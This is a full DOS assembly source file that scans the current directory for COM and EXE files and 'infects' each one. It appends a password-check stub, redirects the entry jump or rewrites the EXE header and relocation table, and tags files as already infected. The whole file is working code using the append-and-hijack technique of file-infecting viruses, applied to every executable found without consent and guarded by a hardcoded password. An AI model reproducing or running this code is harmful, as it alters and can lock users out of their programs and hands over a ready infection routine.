.model tiny
.code

        ORG     100h

START:
        jmp     BEGINCODE               ;Jump the identification string
        DB      'CG'

BEGINCODE:

        mov     dx, offset filter1
        call    FIND_FILES
        mov     dx, offset filter2
        call    FIND_FILES

        mov     ax, 4C00h               ;DOS terminate
        int     21h

;-------------------------------------------------------------------------
;Procedure to find and then infect files
;-------------------------------------------------------------------------
FIND_FILES:

        mov     ah, 4Eh                 ;Search for files matching filter
        int     21h

SLOOP:
        jc      DONE
        mov     ax, 3D02h               ;Open file R/W
        mov     dx, 9Eh                 ;Filename, stored in DTA
        int     21h
        mov     bx, ax                  ;Save file handle in bx
        mov     ax, 3F00h               ;Read first 5 bytes from file
        mov     cx, 5
        mov     dx, offset obytes
        int     21h

        ;Check to see if file is really an EXE
        cmp     word ptr[obytes], 'ZM'
        je      EXE

COM:
        ;Check to see if file is already infected
        ;if it is, then skip it
        cmp     word ptr [obytes + 3], 'GC'
        je      NO_INFECT


        ;Make sure file isn't too large
        mov     ax, ds:[009Ah]          ;Size of file
        add     ax, offset ENDGUARD - offset COMGUARD + 100h
        jc      NO_INFECT               ;If ax overflows then don't infect

        ;If we made it this far then we know the file is safe to modify
        call    INFECT_COM
        jmp     NO_INFECT

EXE:
        ;Read the EXE Header
        call    READ_HEADER
        jc      NO_INFECT               ;error reading file so skip it

        ;Make sure it hasn't already been infected
        ;If (initial CS * 16) + (size of EXEGUARD) + (size of header) == size
        ;  then the file has already been infected
        mov     ax, word ptr [exehead+22]
        mov     dx, 16
        mul     dx
        add     ax, offset ENDGUARD2 - offset EXEGUARD
        adc     dx, 0
        mov     cx, word ptr [exehead+8]
        add     cx, cx
        add     cx, cx
        add     cx, cx
        add     cx, cx
        add     ax, cx
        adc     dx, 0
        cmp     ax, word ptr cs:[9Ah]
        jne     EXEOK
        cmp     dx, word ptr cs:[9Ch]
        je      NO_INFECT

EXEOK:
        ;Make sure Overlay Number is 0
        cmp     word ptr [exehead+26], 0
        jnz     NO_INFECT

        ;Make sure it is a DOS EXE (as opposed to windows or OS/2
        cmp     word ptr [exehead+24], 40h
        jae     NO_INFECT

        call    INFECT_EXE

NO_INFECT:
        mov     ax, 4F00h               ;Find next file
        int     21h
        jmp     SLOOP

DONE:

        ret


;-------------------------------------------------------------------------
;Procedure to infect COM files
;-------------------------------------------------------------------------
INFECT_COM:
        xor     cx, cx                  ;cx = 0
        xor     dx, dx                  ;dx = 0
        mov     ax, 4202h               ;Move file pointer to the end of file
        int     21h

        mov     ax, 4000h               ;Write the code to the end of file
        mov     dx, offset COMGUARD
        mov     cx, offset ENDGUARD - offset COMGUARD
        int     21h

        mov     ax, 4200h               ;Move file pointer to beginning of
        xor     cx, cx                  ; file to write jump
        xor     dx, dx
        int     21h

        ;Prepare the jump instruction to be written to beginning of file
        xor     ax, ax
        mov     byte ptr [bytes], 0E9h  ;opcode for jmp
        mov     ax, ds:[009Ah]          ;size of the file
        sub     ax, 3                   ;size of the jump instruction
        mov     word ptr [bytes + 1], ax;size of the jump

        ;Write the jump
        mov     cx, 5;                  ;size to be written
        mov     dx, offset bytes
        mov     ax, 4000h
        int     21h

        mov     ah, 3Eh                 ;Close file
        int     21h

        ret


;-------------------------------------------------------------------------
;Procedure to infect EXE files
;-------------------------------------------------------------------------
INFECT_EXE:

        ;Check the relocation pointer table to see if there is
        ;room.  If there isn't then we'll have to make room.
        mov     ax, word ptr [exehead+8];size of header in paragraphs
        add     ax, ax                  ;
        add     ax, ax                  ;Convert to double words.
        sub     ax, word ptr [exehead+6];Subtract # of entries each of
        add     ax, ax                  ;which is a double word and then
        add     ax, ax                  ;convert the final total to bytes.
        sub     ax, word ptr [exehead+24];If there are 8 bytes left after
        cmp     ax, 8                    ;you subtract the offset to the
        jc      NOROOM                   ;reloc table then there is room.
        jmp     HAVEROOM

NOROOM:
        ;Not enough room in the relocation table so we are going to
        ;have to add a paragraph to the table.  As a result, we must
        ;read in the whole file after the relocation table and write
        ;it back out one paragraph down in memory.
        xor     cx, cx                  ;Move the file pointer to the end of
        mov     dx, word ptr [exehead+24]  ;the relocation pointer table.
        mov     ax, word ptr [exehead+6];size of relocation table in doubles
        add     ax, ax                  ;* 4 to get bytes
        add     ax, ax
        add     dx, ax                  ;add that to start of table
        push    dx
        mov     ax, 4200h
        int     21h

        pop     dx
        call    CALC_SIZE
        cmp     cx, 1
        je      LASTPAGE

        mov     dx, offset buffer
        call    READ_PAGE
        mov     dx, offset para
        call    READ_PARA
        call    DECFP_PAGE
        call    WRITE_PAGE
        call    MOVE_PARA
        dec     cx
        cmp     cx, 1
        je      LASTPAGE

MOVELOOP:
        mov     dx, offset buffer + 16
        call    READ_PAGE
        call    DECFP_PAGE
        call    WRITE_PAGE
        call    MOVE_PARA
        dec     cx
        cmp     cx, 1
        jne     MOVELOOP

LASTPAGE:
        sub     word ptr [lps], 16
        mov     cx, word ptr [lps]
        mov     dx, offset buffer + 16
        mov     ah, 3Fh
        int     21h
        push    cx
        mov     dx, cx
        neg     dx
        mov     cx, -1
        mov     ax, 4201h
        int     21h
        pop     cx
        add     cx, 16
        mov     dx, offset buffer
        mov     ah, 40h
        int     21h

        ;Got to adjust the file size since it will be used later
        add     word ptr cs:[9Ah], 16
        adc     word ptr cs:[9Ch], 0

        ;Increment the header size within the EXE header
        add     word ptr cs:[exehead+8], 1

        ;Change Page Count and Last Page Size in EXE header
        cmp     word ptr [exehead+2], 496
        jae     ADDPAGE
        add     word ptr [exehead+2], 16
        jmp     HAVEROOM

ADDPAGE:
        ;Adjust the header to add a page if the 16 additional bytes run
        ;over to a new page.
        inc     word ptr [exehead+4]
        mov     ax, 512
        sub     ax, word ptr [exehead+2]
        mov     dx, 16
        sub     dx, ax
        mov     word ptr [exehead+2], dx

HAVEROOM:
        mov     ax, word ptr [exehead+14] ;save orig stack segment
        mov     [hosts], ax
        mov     ax, word ptr [exehead+16] ;save orig stack pointer
        mov     [hosts+2], ax
        mov     ax, word ptr [exehead+20] ;save orig ip
        mov     [hostc], ax
        mov     ax, word ptr [exehead+22] ;save orig cs
        mov     [hostc+2], ax

        mov     cx, word ptr cs:[9Ch]   ;adjust file length to paragraph
        mov     dx, word ptr cs:[9Ah]   ;  boundary
        or      dl, 0Fh
        add     dx, 1
        adc     cx, 0
        mov     cs:[9Ch], cx
        mov     cs:[9Ah], dx
        mov     ax, 4200h               ;move file pointer to end of file
        int     21h                     ;plus boundary

        mov     cx, offset ENDGUARD2 - offset EXEGUARD  ;write code to end
        mov     dx, offset EXEGUARD                     ;of the exe file
        mov     ah, 40h
        int     21h

        xor     cx, cx                  ;Move file pointer to beginning of file
        xor     dx, dx
        mov     ax, 4200h
        int     21h

        ;adjust the EXE header and then write it back out
        mov     ax, word ptr cs:[9Ah]   ;calculate module's CS
        mov     dx, word ptr cs:[9Ch]      ;ax:dx contains orig file size
        mov     cx, 16                  ;CS = file size / 16 - header size
        div     cx
        sub     ax, word ptr [exehead+8];header size in paragraphs
        mov     word ptr [exehead+22], ax ;ax is now initial cs
        mov     word ptr [exehead+14], ax ;ax is now initial ss
        mov     word ptr [exehead+20], 0  ;initial ip
        mov     word ptr [exehead+16], ENDGUARD2 - EXEGUARD + 100h ;initial sp

        mov     dx, word ptr cs:[9Ch]   ;calculate new size file size
        mov     ax, word ptr cs:[9Ah]
        add     ax, offset ENDGUARD2 - offset EXEGUARD + 200h
        adc     dx, 0
        mov     cx, 200h
        div     cx
        mov     word ptr [exehead+4], ax
        mov     word ptr [exehead+2], dx
        add     word ptr [exehead+6], 2

        mov     cx, 1Ch                 ;Write out the new header
        mov     dx, offset exehead
        mov     ah, 40h
        int     21h

        ;modify relocatables table
        mov     ax, word ptr [exehead+6];Get the # of relocatables
        dec     ax                      ;Position to add relocatable equals
        dec     ax                      ;(# - 2)*4 + table offset
        mov     cx, 4
        mul     cx
        add     ax, word ptr [exehead+24]
        adc     dx, 0
        mov     cx, dx
        mov     dx, ax
        mov     ax, 4200h               ;move file pointer to position
        int     21h

        ;Use exehead as a buffer for relocatables.
        ;Put two pointers in this buffer, first points to ss in
        ;hosts and second points to cs in hostc.
        mov     word ptr [exehead], ENDGUARD2 - EXEGUARD - 10
        mov     ax, word ptr [exehead+22]
        mov     word ptr [exehead+2], ax
        mov     word ptr [exehead+4], ENDGUARD2 - EXEGUARD - 4
        mov     word ptr [exehead+6], ax
        mov     cx, 8
        mov     dx, offset exehead
        mov     ah, 40h                 ;Write the 8 bytes.
        int     21h
        mov     ah, 3Eh                 ;Close the file.
        int     21h

        ret                             ;Done!

;-------------------------------------------------------------------------
;Procedure to calculate the amount that needs to be written
;-------------------------------------------------------------------------
CALC_SIZE:
        ;dx holds the position in the file where we want to start reading.
        ;So, the amount to read in and write back out is equal to the size
        ;of the file minus dx.

        mov     cx, word ptr [exehead+2]
        mov     word ptr [lps], cx      ;Copy Last Page Size into lps
        mov     cx, word ptr [exehead+4];Copy Num Pages into cx

        cmp     dx, word ptr [lps]      ;If bytes to subtract are less than
        jbe     FINDLPS                 ;lps then just subtract them and exit
        mov     ax, dx
        xor     dx, dx
        mov     cx, 512
        div     cx                      ;ax = pages to subtract
        mov     cx, word ptr [exehead+4];dx = remainder to subtract from lps
        sub     cx, ax
        cmp     dx, word ptr [lps]
        jbe     FINDLPS
        sub     cx, 1
        mov     ax, dx
        sub     ax, word ptr [lps]
        mov     dx, 512
        sub     dx, ax

FINDLPS:
        sub     word ptr [lps], dx      ;Subtract start position and leave
                                        ;Num Pages the same

        ret

;-------------------------------------------------------------------------
;Procedure to read the EXE Header
;-------------------------------------------------------------------------
READ_HEADER:
        xor     cx, cx                  ;Move the file pointer back
        xor     dx, dx                  ;to the beginning of the file
        mov     ax, 4200h
        int     21h
        mov     cx, 1Ch                 ;read exe header (28 bytes)
        mov     dx, offset exehead      ;into buffer
        mov     ah, 3Fh
        int     21h

        ret                             ;return with cf set properly

;-------------------------------------------------------------------------
;Procedure to read a page
;-------------------------------------------------------------------------
READ_PAGE:
        push    ax
        push    cx

        mov     ah, 3Fh
        mov     cx, 512
        int     21h

        pop     cx
        pop     ax

        ret

;-------------------------------------------------------------------------
;Procedure to read a paragraph
;-------------------------------------------------------------------------
READ_PARA:
        push    ax
        push    cx

        mov     ah, 3Fh
        mov     cx, 16
        int     21h

        pop     cx
        pop     ax


        ret

;-------------------------------------------------------------------------
;Procedure to write a page
;-------------------------------------------------------------------------
WRITE_PAGE:
        push    ax
        push    cx
        push    dx

        mov     ah, 40h
        mov     cx, 512
        mov     dx, offset buffer
        int     21h

        pop     dx
        pop     cx
        pop     ax

        ret

;-------------------------------------------------------------------------
;Procedure to write a paragraph
;-------------------------------------------------------------------------
WRITE_PARA:
        push    ax
        push    cx
        push    dx

        mov     ah, 40h
        mov     cx, 16
        mov     dx, offset buffer
        int     21h

        pop     dx
        pop     cx
        pop     ax

        ret

;-------------------------------------------------------------------------
;Procedure to move file pointer back a page
;-------------------------------------------------------------------------
DECFP_PAGE:
        push    ax
        push    cx
        push    dx

        mov     ax, 4201h
        mov     cx, -1
        mov     dx, -512
        int     21h

        pop     dx
        pop     cx
        pop     ax

        ret

;-------------------------------------------------------------------------
;Procedure to move file pointer back a para
;-------------------------------------------------------------------------
DEC_PARA:
        push    ax
        push    cx
        push    dx

        mov     ax, 4201h
        mov     cx, -1
        mov     dx, -16
        int     21h

        pop     dx
        pop     cx
        pop     ax

        ret

;-------------------------------------------------------------------------
;Procedure to move the paragraph buffer to the front
;-------------------------------------------------------------------------
MOVE_PARA:
        push    cx

        mov     si, offset para
        mov     di, offset buffer
        mov     cx, 16
        rep     movsb

        pop     cx

        ret



;-------------------------------------------------------------------------
;Code to add to COM files
;-------------------------------------------------------------------------
COMGUARD:
        call    GET_START

GET_START:
        pop     bp
        sub     bp, offset GET_START

        mov     ah, 9h                  ;DOS print string
        lea     dx, [bp + prompt]       ;Print the password prompt
        int     21h
        lea     di, [bp + guess]
        xor     cx, cx

READLOOP:
        mov     ah, 7h                  ;Read without echo
        int     21h
        inc     cx                      ;Count of characters entered
        stosb                           ;Store guess for comparison later
        cmp     cx, 10                  ;Limit guess to 10 chars including CR
        je      CHECKPASS
        cmp     al, 13                  ;Quit loop when CR read
        jne     READLOOP

CHECKPASS:
        lea     di, [bp + guess]        ;Setup for passwd checking loop
        lea     si, [bp +passwd]        ;Setup addresses for cmpsb
        xor     cx, cx                  ;Set counter to zero
        cld                             ;Tell cmpsb to increment si and di

CHECKLOOP:
        cmpsb                           ;Compare passwd with guess
        jne     FAIL                    ;Abort program if password is wrong
        inc     cx                      ;Increment counter
        cmp     cx, 8                   ;Only check first 8 chars
        jne     CHECKLOOP               ;Loop until you've read first 8

SUCCESS:
        mov     cx, 5
        cld
        lea     si, [bp + obytes]
        mov     di, 100h
        rep     movsb
        push    100h                    ;return from the jump to execute
        ret                             ;the host program

FAIL:
        mov     ah, 9h                  ;DOS print string
        lea     dx, [bp + badpass]      ;Print bad password msg
        int     21h
        mov     ax, 4C00h
        int     21h

prompt  DB      'password: ','$'
badpass DB      'Invalid password!','$'
passwd  DB      'smcrocks'
guess   DB      10 dup (0)
obytes  DB      0,0,0,0,0

ENDGUARD:


;-------------------------------------------------------------------------
;Code to add to EXE files
;-------------------------------------------------------------------------
EXEGUARD:
        push    ax                      ;Save startup value in ax
        push    ds                      ;Save value of ds
        mov     ax, cs                  ;Put cs into ds and es
        mov     ds, ax
        mov     es, ax
        mov     bp, offset ENDGUARD2 - offset EXEGUARD
        mov     ax, [bp-4]

        mov     ah, 9h                  ;DOS print string
        lea     dx, [bp-57]             ;Print the password prompt
        int     21h
        lea     di, [bp-20]
        xor     cx, cx

EREADLOOP:
        mov     ah, 7h                  ;Read without echo
        int     21h
        inc     cx                      ;Count of characters entered
        stosb                           ;Store guess for comparison later
        cmp     cx, 10                  ;Limit guess to 10 chars including CR
        je      ECHECKPASS
        cmp     al, 13                  ;Quit loop when CR read
        jne     EREADLOOP

ECHECKPASS:
        lea     di, [bp-20]             ;Setup for passwd checking loop
        lea     si, [bp-28]             ;Setup addresses for cmpsb
        xor     cx, cx                  ;Set counter to zero
        cld                             ;Tell cmpsb to increment si and di

ECHECKLOOP:
        cmpsb                           ;Compare passwd with guess
        jne     EFAIL                   ;Abort program if password is wrong
        inc     cx                      ;Increment counter
        cmp     cx, 8                   ;Only check first 8 chars
        jne     ECHECKLOOP              ;Loop until you've read first 8

ESUCCESS:
        pop     ds
        mov     ax, ds
        mov     es, ax
        pop     ax

        cli
        mov     ss, word ptr cs:[bp-10]
        mov     sp, word ptr cs:[bp-8]
        sti

        xor     cx, cx
        xor     dx, dx
        xor     bp, bp
        xor     si, si
        xor     di, di
        lahf
        xor     ah, ah
        sahf


        jmp     dword ptr cs:[ENDGUARD2-EXEGUARD-6]


EFAIL:
        mov     ah, 9h                  ;DOS print string
        lea     dx, [bp-46]             ;Print bad password msg
        int     21h
        mov     ax, 4C00h
        int     21h

eprompt DB      'password: ','$'
ebadpass DB     'Invalid password!','$'
epasswd DB      'smcrocks'
eguess  DB      10 dup (0)
hosts   DW      0, 0
hostc   DW      0, 0
delta   DW      0

ENDGUARD2:


filter1 DB      '*.com',0
filter2 DB      '*.exe',0
bytes   DB      0,0,0,'CG'
exehead DB      28 dup (0)
buffer  DB      512 dup (0)
para    DB      16 dup (0)
lps     DW      0

END START